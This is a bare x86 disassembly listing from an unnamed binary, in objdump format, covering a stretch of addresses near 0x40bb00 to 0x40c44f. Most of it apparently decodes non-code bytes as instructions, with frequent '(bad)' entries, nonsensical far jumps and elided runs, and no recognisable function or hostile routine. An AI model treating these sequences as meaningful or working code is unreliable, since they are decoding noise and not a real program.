  40baaa:	add    BYTE PTR [ebx-0x37ffc04e],ch
  40bab0:	stos   BYTE PTR es:[edi],al
  40bab1:	aas    
  40bab2:	add    BYTE PTR [edx+0x15],cl
  40bab5:	add    BYTE PTR ds:[ecx+0x5],dl
  40bab9:	ds add al,dh
  40babc:	jl     0x40bafd
  40babe:	add    BYTE PTR ds:0xba004711,ah
  40bac4:	push   cs
  40bac5:	push   eax
  40bac6:	add    BYTE PTR [ebp-0x4fffc0f2],ch
  40bacc:	push   cs
  40bacd:	add    BYTE PTR [eax],al
  40bacf:	mov    dh,0xe
  40bad1:	dec    edi
  40bad2:	add    BYTE PTR [eax],al
  40bad4:	pop    eax
  40bad5:	std    
  40bad6:	(bad)  
  40bad7:	call   DWORD PTR [edx]
  40bad9:	mov    esp,0x52a40040
  40bade:	pop    edi
  40badf:	dec    edi
  40bae0:	mov    ah,0x5f
  40bae2:	outs   dx,BYTE PTR ds:[esi]
  40bae3:	push   esp
  40bae4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bae5:	dec    esp
  40bae6:	push   ebx
  40bae7:	outs   dx,DWORD PTR ds:[esi]
  40bae8:	xchg   edi,eax
  40bae9:	imul   esp,DWORD PTR [ebp+0x74],0xfffffcf4
  40baf0:	xchg   esp,eax
  40baf1:	push   edx
  40baf2:	pop    edi
  40baf3:	inc    ebx
  40baf4:	js     0x40bb5b
  40baf6:	jae    0x40bb5d
  40baf8:	mov    ah,0xfc
  40bafa:	(bad)  
  40bafb:	jmp    DWORD PTR [edx+edx*2+0x613b505f]
  40bb02:	ins    BYTE PTR es:[edi],dx
  40bb03:	add    ah,dh
  40bb05:	push   ecx
  40bb06:	pop    edi
  40bb07:	push   edx
	...
  40bb24:	add    BYTE PTR [eax],al
  40bb26:	push   ecx
  40bb27:	pop    ebp
  40bb28:	fs add ah,ah
  40bb2b:	push   ecx
  40bb2c:	pop    edi
  40bb2d:	push   edi
  40bb2e:	ss gs je 0x40bb97
  40bb32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb33:	cld    
  40bb34:	(bad)  
  40bb35:	push   DWORD PTR [ebx]
  40bb37:	pop    ecx
  40bb38:	je     0x40bb8a
  40bb3a:	inc    esi
  40bb3b:	addr16 fs jne 0x40bb06
  40bb3f:	outs   dx,DWORD PTR ds:[esi]
  40bb40:	dec    ecx
  40bb41:	outs   dx,BYTE PTR ds:[esi]
  40bb42:	add    ah,BYTE PTR [edi+0x0]
  40bb45:	add    ah,bh
  40bb47:	outs   dx,DWORD PTR ds:[esi]
  40bb48:	je     0x40bbba
  40bb4a:	ds daa 
  40bb4c:	das    
  40bb4d:	ja     0x40bb52
  40bb4f:	outs   dx,DWORD PTR ds:[esi]
  40bb50:	cs (bad) 
  40bb52:	std    
  40bb53:	gs addr16 cs pop ss
  40bb57:	ins    DWORD PTR es:[di],dx
  40bb59:	das    
  40bb5a:	xor    al,0xfc
  40bb5c:	(bad)  
  40bb5d:	dec    DWORD PTR [eax+esi*2]
  40bb60:	je     0x40bbd2
  40bb62:	out    dx,al
  40bb63:	es das 
  40bb65:	ja     0x40bbaa
  40bb67:	outs   dx,DWORD PTR ds:[esi]
  40bb68:	cs addr16 or eax,0xa96767c2
  40bb6f:	ret    
  40bb70:	sub    BYTE PTR [ebx-0x5e],ah
  40bb73:	shl    DWORD PTR [edi],cl
  40bb75:	add    BYTE PTR ds:0xd3f858d,cl
  40bb7b:	in     eax,dx
  40bb7c:	test   DWORD PTR [edi],edi
  40bb7e:	or     eax,0xd79029a
  40bb83:	call   0x7302:0x900d4c02
	...
  40bba6:	add    BYTE PTR [eax],al
  40bba8:	or     eax,0xd560295
  40bbad:	add    BYTE PTR [edx],0x65
  40bbb0:	or     eax,0xd330376
  40bbb5:	mov    ebx,0x9c0d0002
  40bbba:	add    al,BYTE PTR [ebp+ecx*1-0x60]
  40bbbe:	add    al,BYTE PTR [ebx+0xd]
  40bbc1:	dec    ebp
  40bbc2:	add    al,0x69
  40bbc4:	or     eax,0xd6e043c
  40bbc9:	push   ebp
  40bbca:	add    al,0x0
  40bbcc:	or     eax,0xd69042a
  40bbd1:	dec    edx
  40bbd2:	add    al,0x65
  40bbd4:	or     eax,0xd6f043b
  40bbd9:	adc    al,0x4
  40bbdb:	dec    ecx
  40bbdc:	or     eax,0xd6e040e
  40bbe1:	add    eax,0x1b0d4604
  40bbe6:	add    al,0x61
  40bbe8:	or     eax,0xd6503fc
  40bbed:	jmp    0x2a4dbbf4
  40bbf2:	add    al,0x6f
  40bbf4:	or     eax,0xd730407
  40bbf9:	inc    BYTE PTR [ebx]
  40bbfb:	ins    BYTE PTR es:[edi],dx
  40bbfc:	or     eax,0xd5703fc
  40bc01:	add    al,dl
  40bc03:	add    edi,DWORD PTR [ebx-0x4dfc3b01]
  40bc09:	(bad)  
  40bc0a:	fld    QWORD PTR [ebx]
	...
  40bc28:	add    BYTE PTR [eax],al
  40bc2a:	into   
  40bc2b:	(bad)  
  40bc2c:	mov    esp,0xb9ffac03
  40bc31:	add    edi,DWORD PTR [esi+0x0]
  40bc34:	jmp    0xa40c93c
  40bc39:	add    al,0x3e
  40bc3b:	add    bl,bh
  40bc3d:	add    edi,DWORD PTR [edx]
  40bc3f:	add    bh,bl
  40bc41:	add    esp,DWORD PTR ds:0xd03e900
  40bc47:	add    BYTE PTR [edx-0x65ffabfd],bh
  40bc4d:	add    edi,DWORD PTR [esi]
  40bc4f:	add    BYTE PTR [ecx-0x7affd3fd],dl
  40bc55:	add    esi,DWORD PTR [edx]
  40bc57:	add    BYTE PTR [esi+0x3],bh
  40bc5a:	or     eax,0x554aa700
  40bc5f:	inc    ebp
  40bc60:	sub    al,0x4
  40bc62:	or     eax,0xf7271300
  40bc67:	jmp    DWORD PTR [edi]
  40bc69:	arpl   WORD PTR [esi],bp
  40bc6b:	pop    ebp
  40bc6c:	pop    ecx
  40bc6d:	jo     0x40bc4f
  40bc6f:	inc    ebx
  40bc70:	dec    eax
  40bc71:	data16 repnz ins BYTE PTR es:[edi],dx
  40bc74:	dec    eax
  40bc75:	pop    edi
  40bc76:	call   0xd44c5b4
  40bc7b:	add    BYTE PTR [edx],ch
  40bc7d:	jcxz   0x40bce5
  40bc80:	or     al,0x63
  40bc82:	loope  0x40bcec
  40bc84:	push   cs
  40bc85:	data16 daa 
  40bc87:	and    BYTE PTR [edx],ch
  40bc89:	push   0x90472ea
	...
  40bcaa:	add    BYTE PTR [eax],al
  40bcac:	pop    es
  40bcad:	add    ah,bh
  40bcaf:	jno    0x40bc6a
  40bcb1:	fs push cs
  40bcb3:	repz pop bx
  40bcb6:	add    BYTE PTR ds:0x1dffffa5,al
  40bcbc:	scas   eax,DWORD PTR es:[edi]
  40bcbd:	imul   esp,DWORD PTR [ecx-0x30],0xffffffb0
  40bcc1:	dec    esp
  40bcc2:	jae    0x40bc88
  40bcc4:	pushf  
  40bcc5:	inc    eax
  40bcc6:	addr16 int3 
  40bcc8:	mov    al,0x6b
  40bcca:	push   ebx
  40bccb:	aad    0x9c
  40bccd:	push   0xece6e
  40bcd2:	add    BYTE PTR [edi],ch
  40bcd4:	loope  0x40bd15
  40bcd6:	add    BYTE PTR [ecx+0x4003fd6],cl
  40bcdc:	or     DWORD PTR [ecx+0x0],esi
  40bcdf:	int3   
  40bce0:	push   cs
  40bce1:	xor    BYTE PTR [eax],al
  40bce3:	loope  0x40bcf3
  40bce5:	js     0x40bce7
  40bce7:	(bad)  
  40bce8:	push   cs
  40bce9:	sbb    eax,DWORD PTR [eax]
  40bceb:	call   0x710e:0xcc00000e
  40bcf2:	add    ah,al
  40bcf4:	push   cs
  40bcf5:	xor    BYTE PTR [eax],al
  40bcf7:	mov    cl,0xe
  40bcf9:	js     0x40bcfb
  40bcfb:	jmp    0x2e40bd0e
  40bd00:	sub    al,0x6c
  40bd02:	push   eax
  40bd03:	pop    ebx
  40bd04:	sub    ah,BYTE PTR [ecx+0x41]
  40bd07:	dec    ebp
  40bd08:	sub    eax,0x1e5a6572
  40bd0d:	add    BYTE PTR [eax],al
  40bd0f:	xor    eax,0x0
	...
  40bd2c:	add    BYTE PTR [eax],al
  40bd2e:	repnz pop esi
  40bd30:	fs sub eax,0x487261f0
  40bd36:	push   DWORD PTR [esi+0x41]
  40bd39:	jmp    0x3740bd4c
  40bd3e:	fld    QWORD PTR [eax+0x72]
  40bd41:	add    al,0xe8
  40bd43:	imul   esp,DWORD PTR [ebp+0x3d],0xffffffe9
  40bd47:	jno    0x40bdae
  40bd49:	or     ch,ch
  40bd4b:	(bad)  
  40bd4c:	(bad)  
  40bd4d:	inc    DWORD PTR [edx]
  40bd4f:	jo     0x40bd94
  40bd51:	jb     0x40bd5c
  40bd53:	pop    ebx
  40bd54:	je     0x40bdbb
  40bd56:	sbb    DWORD PTR [ecx+0x65],esi
  40bd59:	jb     0x40bd6f
  40bd5b:	jb     0x40bdcc
  40bd5d:	arpl   WORD PTR [ecx+0x72],bx
  40bd60:	jae    0x40bd62
  40bd62:	jb     0x40bdc9
  40bd64:	push   ecx
  40bd65:	jne    0x40bdb0
  40bd67:	outs   dx,DWORD PTR ds:[esi]
  40bd68:	jns    0x40bdb3
  40bd6a:	push   edx
  40bd6b:	push   ebx
  40bd6c:	outs   dx,DWORD PTR ds:[esi]
  40bd6d:	jb     0x40bd50
  40bd6f:	pop    ebx
  40bd70:	je     0x40bddb
  40bd72:	rcr    DWORD PTR [edx+0x50],cl
  40bd75:	jb     0x40bd4a
  40bd77:	popa   
  40bd78:	gs jae 0x40bd32
  40bd7b:	add    BYTE PTR [eax],al
  40bd7d:	add    BYTE PTR [esi-0x78aa939c],ah
  40bd83:	pop    edi
  40bd84:	jb     0x40bdda
  40bd86:	mov    WORD PTR [esi+0x65],gs
  40bd89:	popa   
  40bd8a:	mov    BYTE PTR [ecx+0x74],dl
  40bd8d:	popa   
  40bd8e:	inc    esi
  40bd8f:	add    BYTE PTR gs:[eax],al
	...
  40bdae:	add    BYTE PTR [eax],al
  40bdb0:	jo     0x40be06
  40bdb2:	jb     0x40be00
  40bdb4:	xchg   ebx,eax
  40bdb5:	pop    ebx
  40bdb6:	fs inc esp
  40bdb8:	xor    BYTE PTR [ebp+0x0],bl
  40bdbb:	add    al,ah
  40bdbd:	pop    edi
  40bdbe:	jb     0x40be07
  40bdc0:	dec    ecx
  40bdc1:	jo     0x40be07
  40bdc3:	ins    BYTE PTR es:[edi],dx
  40bdc4:	push   eax
  40bdc5:	inc    esp
  40bdc6:	popa   
  40bdc7:	outs   dx,BYTE PTR ds:[esi]
  40bdc8:	dec    eax
  40bdc9:	push   0xfc270065
  40bdce:	dec    esi
  40bdcf:	add    BYTE PTR [edx],ch
  40bdd1:	cld    
  40bdd2:	push   ebx
  40bdd3:	add    BYTE PTR [ebx],bl
  40bdd5:	cld    
  40bdd6:	inc    eax
  40bdd7:	add    BYTE PTR [esi],dl
  40bdd9:	cld    
  40bdda:	inc    esp
  40bddb:	add    al,dl
  40bddd:	sti    
  40bdde:	dec    esp
  40bddf:	add    ch,bh
  40bde1:	sti    
  40bde2:	bound  eax,QWORD PTR [eax]
  40bde4:	or     eax,0xd6f0419
  40bde9:	sbb    al,BYTE PTR [edi+ebp*2]
  40bdec:	or     eax,0xd740405
  40bdf1:	adc    eax,DWORD PTR [edi+edx*2]
  40bdf4:	or     eax,0xd6e0400
  40bdf9:	sti    
  40bdfa:	add    ebp,DWORD PTR [edi+0xd]
  40bdfd:	(bad)  
  40bdfe:	add    dh,BYTE PTR [ebx+0xd]
  40be01:	pop    es
  40be02:	add    al,0x4e
  40be04:	or     eax,0xd5c02b3
  40be09:	stos   BYTE PTR es:[edi],al
  40be0a:	add    dh,BYTE PTR [ebp+0xd]
  40be0d:	mov    bh,0x2
  40be0f:	jb     0x40be1e
  40be11:	mov    esp,0x6e02
	...
  40be32:	or     eax,0xd5602b5
  40be37:	mov    esp,0x960d7202
  40be3c:	add    ch,BYTE PTR [ecx+0xd]
  40be3f:	add    BYTE PTR [edx],0x6e
  40be42:	or     eax,0xd5002ad
  40be47:	xchg   edi,eax
  40be48:	add    ch,BYTE PTR [edi+0xd]
  40be4b:	add    DWORD PTR [edx],0x69
  40be4e:	or     eax,0xd650285
  40be53:	popf   
  40be54:	add    ch,BYTE PTR [ecx+0xd]
  40be57:	jbe    0x40be5c
  40be59:	je     0x40be68
  40be5b:	cmp    eax,0x560d2504
  40be60:	add    al,0x0
  40be62:	or     eax,0xd720439
  40be67:	xor    al,BYTE PTR [esi+eiz*2]
  40be6a:	or     eax,0xd6c0450
  40be6f:	cmp    al,0x4
  40be71:	dec    ecx
  40be72:	or     eax,0xd61043c
  40be77:	cmp    al,BYTE PTR [eiz*2+0x439000d]
  40be7e:	in     al,dx
  40be7f:	call   DWORD PTR [esp+eax*1]
  40be82:	in     eax,0xff
  40be84:	call   0xe940cb8c
  40be89:	outs   dx,DWORD PTR ds:[esi]
  40be8a:	add    ebx,DWORD PTR [ecx]
  40be8c:	call   0xda59ba00
  40be91:	ror    DWORD PTR [edx+0x78],0xdd
  40be95:	rol    DWORD PTR [eax],0x0
	...
  40beb4:	inc    edx
  40beb5:	js     0x40be92
  40beb7:	and    bh,ah
  40beb9:	popf   
  40beba:	retf   0xae03
  40bebd:	(bad)  
  40bebe:	call   0xbc40cbc6
  40bec3:	mov    BYTE PTR [esi],ah
  40bec5:	jg     0x40bf03
  40bec7:	pop    ds
  40bec8:	mov    ds,WORD PTR [ebp+eax*2+0x3]
  40becc:	pop    esi
  40becd:	xchg   DWORD PTR [ebx-0x567a9cf9],ebx
  40bed3:	dec    ebx
  40bed4:	add    ch,BYTE PTR [ebx-0x2e1db308]
  40beda:	add    esi,ebp
  40bedc:	je     0x40bedf
  40bede:	retf   0x64f3
  40bee1:	or     ah,BYTE PTR [esi+edi*1-0x4f]
  40bee5:	dec    edi
  40bee6:	pusha  
  40bee7:	outs   dx,BYTE PTR ds:[esi]
  40bee8:	shl    edi,0x95
  40beeb:	jp     0x40bef9
  40beed:	add    BYTE PTR [edx-0x38],dh
  40bef0:	mov    dl,0x1d
  40bef2:	inc    BYTE PTR [ecx]
  40bef4:	or     eax,0x12fb6a5a
  40bef9:	outs   dx,BYTE PTR ds:[esi]
  40befa:	sti    
  40befb:	jle    0x40bf4c
  40befd:	adc    BYTE PTR [esp+eax*8+0x21],ah
  40bf01:	std    
  40bf02:	pop    es
  40bf03:	dec    ecx
  40bf04:	xchg   ecx,eax
  40bf05:	out    0xe6,al
  40bf07:	xchg   dl,cl
  40bf09:	and    esi,DWORD PTR [eax+0x49]
  40bf0c:	add    DWORD PTR [esi+0x3a89fc3b],0xf2def900
  40bf16:	adc    al,0xd1
	...
  40bf34:	add    BYTE PTR [eax],al
  40bf36:	add    BYTE PTR [eax+0x0],al
  40bf39:	jb     0x40bf11
  40bf3b:	jns    0x46c63065
  40bf41:	leave  
  40bf42:	sar    DWORD PTR [ebx],1
  40bf44:	fcomp  QWORD PTR [esi+edx*8+0x2f]
  40bf48:	push   eax
  40bf49:	xchg   BYTE PTR [esp+edx*1],ah
  40bf4c:	adc    ch,BYTE PTR [ecx]
  40bf4e:	adc    DWORD PTR [ebx],eax
  40bf50:	mov    bh,0xef
  40bf52:	test   BYTE PTR [edi+0x74],0xd5
  40bf56:	xchg   ebx,eax
  40bf57:	ficom  DWORD PTR [ebx*8+0x52c02f0a]
  40bf5e:	cmc    
  40bf5f:	xchg   BYTE PTR [esi],al
  40bf61:	iret   
  40bf62:	xchg   ebx,eax
  40bf63:	jb     0x40bf83
  40bf65:	call   0xf12bbf78
  40bf6a:	cmp    edx,0x65
  40bf6d:	jb     0x40bf00
  40bf6f:	adc    eax,0x5a0ee901
  40bf74:	mov    DWORD PTR [edx+esi*8-0x1806bd7a],esp
  40bf7b:	leave  
  40bf7c:	mov    WORD PTR [edx-0x353feb0c],?
  40bf82:	leave  
  40bf83:	mov    BYTE PTR [ecx+edx*1+0x6b],cl
  40bf87:	or     cl,BYTE PTR [ebp-0x7caf2d4c]
  40bf8d:	sub    DWORD PTR ds:0x33e86a50,eax
  40bf93:	ret    
  40bf94:	out    0xfd,eax
  40bf96:	jmp    0x40bf95
  40bf98:	push   DWORD PTR [ecx+0x0]
	...
  40bfb7:	add    BYTE PTR [esi+0x554f57c],bl
  40bfbd:	cs rol dl,0x48
  40bfc1:	test   DWORD PTR [esi],edi
  40bfc3:	bound  ebx,QWORD PTR [ecx+ebx*8+0x26]
  40bfc7:	add    BYTE PTR [ebx],bh
  40bfc9:	sti    
  40bfca:	dec    DWORD PTR [ecx+0x1d9d5ac]
  40bfd0:	gs std 
  40bfd2:	mov    al,BYTE PTR [ebp-0x48]
  40bfd5:	mov    BYTE PTR [esi-0x108c28c],bh
  40bfdb:	add    BYTE PTR [eax],al
  40bfdd:	sub    BYTE PTR [ebx+0x3f726845],cl
  40bfe3:	adc    BYTE PTR [ebx+0x57c019c5],ah
  40bfe9:	dec    eax
  40bfea:	clc    
  40bfeb:	and    DWORD PTR [ebp+eax*1+0x50],0xffffffff
  40bff0:	xor    ecx,ebp
  40bff2:	mov    DWORD PTR [ebp+0x2c],eax
  40bff5:	jb     0x40bff6
  40bff7:	inc    BYTE PTR [ebp+esi*2-0x2adc0000]
  40bffe:	mov    dh,0x98
  40c000:	and    al,0xfd
  40c002:	mov    ebx,eax
  40c004:	mov    ebx,0x36c95b4e
  40c009:	cmc    
  40c00a:	(bad)  
  40c00b:	push   esp
  40c00c:	jg     0x40bfdf
  40c00e:	jg     0x40bffc
  40c010:	mov    ah,0x7
  40c012:	add    BYTE PTR [eax],al
  40c014:	xchg   DWORD PTR [esi-0x75],edx
  40c017:	fsub   DWORD PTR [ebx+0xe8ca71]
	...
  40c039:	add    cl,al
  40c03b:	idiv   bh
  40c03d:	inc    DWORD PTR [edx-0x14fa0987]
  40c043:	jp     0x40c001
  40c045:	add    BYTE PTR [esp+edi*8-0x34e9c99],dh
  40c04c:	dec    DWORD PTR [ecx+eiz*1-0x44000774]
  40c053:	push   ebx
  40c054:	add    BYTE PTR [eax+0x72],dl
  40c057:	js     0x40bfe7
  40c059:	cli    
  40c05a:	mov    ebx,0xde7feee
  40c05f:	cdq    
  40c060:	rol    DWORD PTR [ecx],1
  40c062:	or     eax,0x8e10455e
  40c067:	mov    ds:0x2a4d84ff,al
  40c06c:	add    eax,0xfa4d83
  40c071:	mov    bh,0xd5
  40c073:	in     eax,0xb0
  40c075:	pop    edi
  40c076:	or     bh,ah
  40c078:	add    cl,BYTE PTR [ecx+0x3b6992e0]
  40c07e:	inc    ebx
  40c07f:	fld    DWORD PTR [edi+0x2e70d81]
  40c085:	data16 mov BYTE PTR [edi-0x11788289],ch
  40c08c:	lock enter 0x6f8d,0x3
  40c091:	ja     0x40c034
  40c093:	pop    ebp
  40c094:	push   edi
  40c095:	or     BYTE PTR [eax+0x1af9986b],dl
  40c09b:	push   ecx
  40c09c:	push   ebx
  40c09d:	lea    eax,[eax]
	...
  40c0bb:	add    BYTE PTR [eax+0xafeee76],al
  40c0c1:	test   eax,0x7415c183
  40c0c6:	outs   dx,DWORD PTR ds:[esi]
  40c0c7:	cld    
  40c0c8:	in     eax,0xbb
  40c0ca:	xlat   BYTE PTR ds:[ebx]
  40c0cb:	push   edx
  40c0cd:	pop    ebp
  40c0ce:	les    esi,FWORD PTR [ebx+0x41]
  40c0d1:	bound  edx,QWORD PTR [edi-0x4]
  40c0d4:	es das 
  40c0d6:	jns    0x40c125
  40c0d8:	xchg   BYTE PTR [edx-0xd4a08ee],bl
  40c0de:	ret    0x568c
  40c0e1:	mul    DWORD PTR [ebx]
  40c0e3:	ror    DWORD PTR [esi-0x7df0c3e6],0xf2
  40c0ea:	neg    eax
  40c0ec:	push   ss
  40c0ed:	and    BYTE PTR [ebp+0x7d8b11c1],al
  40c0f3:	xchg   esp,eax
  40c0f4:	jge    0x40c0f6
  40c0f6:	jecxz  0x40c0e8
  40c0f8:	fwait
  40c0f9:	push   edx
  40c0fa:	push   0xffffffc3
  40c0fc:	push   cs
  40c0fd:	push   eax
  40c0fe:	or     bh,BYTE PTR [ebp-0x333efb0c]
  40c104:	aam    0x1
  40c106:	jmp    0xa1c62387
  40c10b:	ja     0x40c121
  40c10d:	jnp    0x40c13a
  40c10f:	cld    
  40c110:	xchg   edi,eax
  40c111:	sub    cl,al
  40c113:	or     dl,bl
  40c115:	add    cl,ch
  40c117:	jl     0x40c178
  40c119:	js     0x40c13e
  40c11b:	std    
  40c11c:	push   0xffffffba
  40c11e:	call   0x40c125
	...
  40c13b:	add    BYTE PTR [eax],al
  40c13d:	add    BYTE PTR ds:0x37fd237a,cl
  40c143:	add    bh,BYTE PTR [ebx+0x224ddbc3]
  40c149:	mov    ebx,0x56e9044c
  40c14e:	xchg   esi,eax
  40c14f:	fsub   QWORD PTR [edi-0x21]
  40c152:	push   ds
  40c153:	add    ecx,ebp
  40c155:	add    edi,DWORD PTR [esi-0x78004486]
  40c15b:	inc    ebx
  40c15c:	stc    
  40c15d:	clc    
  40c15e:	loop   0x40c1b5
  40c160:	bnd ret 
  40c162:	pop    ebx
  40c163:	jge    0x40c126
  40c165:	sbb    DWORD PTR [esi],ebp
  40c167:	(bad)  
  40c168:	in     eax,dx
  40c169:	mov    ecx,0xdb6a0332
  40c16e:	jmp    0xf084:0x13cfab77
  40c175:	add    eax,0x3bb1000d
  40c17a:	pop    ecx
  40c17b:	sub    ah,BYTE PTR [ecx-0x5ed8bec5]
  40c181:	cmp    edi,DWORD PTR [ecx]
  40c183:	cld    
  40c184:	imul   ebx,ebx,0x35e673e6
  40c18a:	int    0xd8
  40c18c:	(bad)  
  40c18d:	out    dx,eax
  40c18e:	or     al,0x0
  40c190:	add    BYTE PTR [edx+0x4b],ah
  40c193:	clc    
  40c194:	mov    ch,cl
  40c196:	stos   DWORD PTR es:[edi],eax
  40c197:	sahf   
  40c198:	xchg   eax,ebp
  40c19a:	push   cs
  40c19b:	add    BYTE PTR [ebx-0x67fd9646],cl
  40c1a1:	jmp    0x40c1a6
	...
  40c1be:	add    BYTE PTR [eax],al
  40c1c0:	push   cs
  40c1c1:	fabs   
  40c1c3:	call   0x353fc1d6
  40c1c8:	jno    0x40c243
  40c1ca:	ret    0xa3c1
  40c1cd:	in     al,dx
  40c1ce:	(bad)  
  40c1cf:	scas   al,BYTE PTR es:[edi]
  40c1d0:	inc    eax
  40c1d1:	rol    DWORD PTR [eax],1
  40c1d3:	jmp    0x920b3ce6
  40c1d8:	push   ebp
  40c1d9:	repnz add cl,ch
  40c1dc:	mov    al,0x82
  40c1de:	imul   ebp
  40c1e0:	mov    esp,0x201de7c5
  40c1e5:	add    al,BYTE PTR [eax]
  40c1e7:	jb     0x40c222
  40c1e9:	jns    0x40c22d
  40c1eb:	(bad)  
  40c1ed:	ror    DWORD PTR [eax-0xdd6cd0c],1
  40c1f3:	(bad)  
  40c1f5:	not    bh
  40c1f7:	add    cl,BYTE PTR [ecx-0x7f]
  40c1fa:	ret    0xba1
  40c1fd:	mov    bh,0xa
  40c1ff:	or     cl,dl
  40c201:	neg    al
  40c203:	fwait
  40c204:	pop    es
  40c205:	mov    bh,0x51
  40c207:	push   0xffffffc9
  40c209:	add    DWORD PTR [eax+0xa],edx
  40c20c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c20d:	push   edi
  40c20e:	add    eax,DWORD PTR [ecx-0x1a]
  40c211:	aaa    
  40c212:	add    ch,cl
  40c214:	push   edi
  40c215:	fld    QWORD PTR [edi+edx*1-0x537581ab]
  40c21c:	(bad)  
  40c21d:	jp     0x40c256
  40c21f:	(bad)
	...
  40c240:	add    BYTE PTR [eax],al
  40c242:	add    DWORD PTR [eax+eax*1],0xf9cbec8a
  40c249:	push   DWORD PTR [ecx+eax*1+0x1b569e9]
  40c250:	add    BYTE PTR [ebx],bh
  40c252:	pushw  0x8905
  40c256:	(bad)  
  40c258:	jmp    0x2b01b963
  40c25d:	mov    DWORD PTR [ecx],ebp
  40c25f:	fdiv   QWORD PTR [ecx]
  40c261:	(bad)  
  40c262:	fadd   st(1),st
  40c264:	(bad)  
  40c265:	jmp    DWORD PTR [eax+eax*4-0x7d]
  40c269:	adc    BYTE PTR [edx+0x457fdde],ah
  40c26f:	imul   edx,DWORD PTR [eax+esi*8-0x23],0x6f
  40c274:	hlt    
  40c275:	call   FWORD PTR [ecx+0x51]
  40c278:	push   ss
  40c279:	inc    eax
  40c27a:	xor    al,0x32
  40c27c:	rol    BYTE PTR [ebx+0x4587ed68],0xa0
  40c283:	sbb    al,0x46
  40c285:	add    al,0x32
  40c287:	arpl   WORD PTR [ecx+0x356a8c45],cx
  40c28d:	add    ebx,DWORD PTR [ecx]
  40c28f:	leave  
  40c290:	mov    eax,DWORD PTR [esi+0x1c]
  40c293:	push   ecx
  40c294:	mov    DWORD PTR [ebp-0x3c],esi
  40c297:	imul   eax,DWORD PTR [esp+eiz*8+0x4c],0x31
  40c29c:	pop    ss
  40c29d:	add    dh,ah
  40c29f:	test   BYTE PTR [esi-0x27e048b],bh
  40c2a5:	or     al,BYTE PTR [eax]
	...
  40c2c3:	add    BYTE PTR [edi+0x6f0168ea],dh
  40c2c9:	ret    
  40c2ca:	mov    ecx,DWORD PTR [ebp+0x24]
  40c2cd:	leave  
  40c2ce:	cmp    DWORD PTR [ebx],edx
  40c2d0:	out    0x0,al
  40c2d2:	jmp    0x40c2f5
  40c2d4:	repz addr16 clc 
  40c2d7:	mov    ecx,DWORD PTR ds:0x388ce69c
  40c2dd:	pop    es
  40c2de:	fucomi st,st(7)
  40c2e0:	and    ecx,ebx
  40c2e2:	add    cl,BYTE PTR [ebx+0x77bc63c5]
  40c2e8:	std    
  40c2e9:	popa   
  40c2ea:	dec    eax
  40c2eb:	loopne 0x40c283
  40c2ed:	cld    
  40c2ee:	ficom  DWORD PTR [eax-0x74fd2702]
  40c2f4:	xor    bl,bl
  40c2f6:	ja     0x40c374
  40c2f8:	adc    ebp,0x2396ec46
  40c2fe:	lock mov cl,al
  40c301:	rol    BYTE PTR [eax+0x78fe6544],cl
  40c307:	out    dx,eax
  40c308:	es pop ds
  40c30a:	or     BYTE PTR [eax+eax*4-0x63],bh
  40c30e:	xor    eax,0x29399e8
  40c313:	add    BYTE PTR [ebx+0xcecb58e],bh
  40c319:	xlat   BYTE PTR ds:[ebx]
  40c31a:	test   esi,edi
  40c31c:	ret    
  40c31d:	idiv   DWORD PTR [eax+0x44]
  40c320:	cmp    eax,0x80fc476f
  40c325:	arpl   WORD PTR [edi],sp
  40c327:	inc    BYTE PTR [eax]
	...
  40c345:	add    BYTE PTR [edx],ch
  40c347:	jne    0x40c3c4
  40c349:	inc    esp
  40c34a:	adc    DWORD PTR [eax+0x6f],esp
  40c34d:	clc    
  40c34e:	xchg   bl,cl
  40c350:	dec    BYTE PTR [edx-0x3a7eb570]
  40c356:	test   BYTE PTR [ecx+0x4c],0x17
  40c35a:	psubusw mm6,QWORD PTR [edi+0x7c]
  40c35e:	or     DWORD PTR [ebx-0x26f68181],edi
  40c364:	jne    0x40c370
  40c366:	ja     0x40c340
  40c368:	pop    eax
  40c369:	add    al,0x3a
  40c36b:	inc    ecx
  40c36c:	add    dh,BYTE PTR [esi+0xc]
  40c36f:	add    cl,ch
  40c371:	cmc    
  40c372:	or     dh,bh
  40c374:	xchg   ebx,eax
  40c375:	adc    eax,0x13830137
  40c37a:	nop
  40c37b:	inc    ebx
  40c37c:	out    0x53,eax
  40c37e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c37f:	lock jnp 0x40c384
  40c382:	or     eax,0xc7686d8
  40c387:	add    BYTE PTR [edi+0x6a124b7a],cl
  40c38d:	inc    edi
  40c38e:	cdq    
  40c38f:	sub    BYTE PTR [edx-0x3c],ch
  40c392:	loope  0x40c37e
  40c394:	sub    ebp,esp
  40c396:	xchg   ebp,eax
  40c397:	ins    DWORD PTR es:[edi],dx
  40c398:	in     eax,0x76
  40c39a:	mov    ecx,0x87f84b77
  40c39f:	aas    
  40c3a0:	fxtract 
  40c3a2:	pop    edx
  40c3a3:	pop    es
  40c3a4:	test   eax,0x69cbd020
  40c3a9:	rol    BYTE PTR [eax],0x0
	...
  40c3c8:	retf   0x75fa
  40c3cb:	clc    
  40c3cc:	arpl   cx,cx
  40c3ce:	add    DWORD PTR [ebx+0x54cbeae7],edi
  40c3d4:	cwde   
  40c3d5:	xchg   ebp,eax
  40c3d6:	clc    
  40c3d7:	in     eax,dx
  40c3d8:	inc    ebx
  40c3d9:	jmp    0x40c415
  40c3db:	cmp    DWORD PTR [edx+0x4],0x56462119
  40c3e2:	jmp    0x9603:0xeb385cdb
  40c3e9:	lock arpl bp,si
  40c3ec:	mov    eax,ds:0x1d7665fc
  40c3f1:	fdiv   st,st(5)
  40c3f3:	fimul  WORD PTR ds:0x31b4000
  40c3f9:	jmp    0x40c448
  40c3fb:	js     0x40c44e
  40c3fd:	clc    
  40c3fe:	jno    0x40c42b
  40c400:	xchg   cl,cl
  40c402:	push   eax
  40c403:	loop   0x40c45c
  40c405:	add    DWORD PTR [eax],eax
  40c407:	jmp    0x55289770
  40c40c:	call   0x5b67c2fb
  40c411:	lock out 0x16,eax
  40c414:	jmp    0x8d5:0xcd62ffff
  40c41b:	mov    edx,0x110873a9
  40c420:	fucom  st(5)
  40c422:	(bad)  
  40c423:	(bad)  
  40c424:	push   esi
  40c425:	dec    edx
  40c426:	pop    ebx
  40c427:	and    ah,cl
  40c429:	add    al,BYTE PTR [eax]
  40c42b:	xchg   esp,eax
	...
  40c448:	add    BYTE PTR [eax],al
  40c44a:	adc    eax,0xc1d580d7
  40c44f:	(bad)  
